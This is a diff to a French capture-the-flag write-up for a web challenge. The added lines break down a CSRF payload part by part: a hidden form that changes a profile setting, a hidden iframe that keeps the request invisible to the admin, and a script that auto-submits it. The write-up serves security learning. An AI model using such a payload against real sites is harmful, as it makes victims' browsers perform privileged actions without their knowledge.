@@ -41,7 +41,23 @@ C'est ce qu'on veut que l'admin exécute. On crée donc un forms HTML à envoyer
 </form><iframe name="x" style="display:none"></iframe>
 <script>document.getElementById('csrf').submit();</script>
 ```
-On envoie ce message avec une adresse mail aléatoire, puis on attend, et on retrouve le flag dans l'onglet Private :
+Je vais expliquer chaque partie de de payload :
+
+première partie : `<form id=csrf method="POST" action="/web-client/ch22/?action=profile" enctype="multipart/form-data" target="x">
+<input type="hidden" name="username" value="test">
+<input type="hidden" name="status" value="on">`
+
+Cette partie est la requête brute qu'on veut que l'admin exécute.
+
+Deuxième partie : `</form><iframe name="x" style="display:none"></iframe>`
+
+Cette partie permet d'exécuter cette requête en arrière plan, sans redirection, ça permet de faire le requête de façon invisible pour l'admin, il n'est pas au courant de ce qu'il se passe.
+
+Dernière partie : `<script>document.getElementById('csrf').submit();</script>`
+
+Cette partie permet simplement de soumettre le formulaire HTML, ce qui va exécuter la requête.
+
+On envoie donc tout ce payload dans le message avec une adresse mail aléatoire, puis on attend, et on retrouve le flag dans l'onglet Private :
 
 <img width="244" height="65" alt="flag" src="https://github.com/user-attachments/assets/b7f7c80b-d8fc-4b09-b5ca-bb96ff8b7dab" />
 
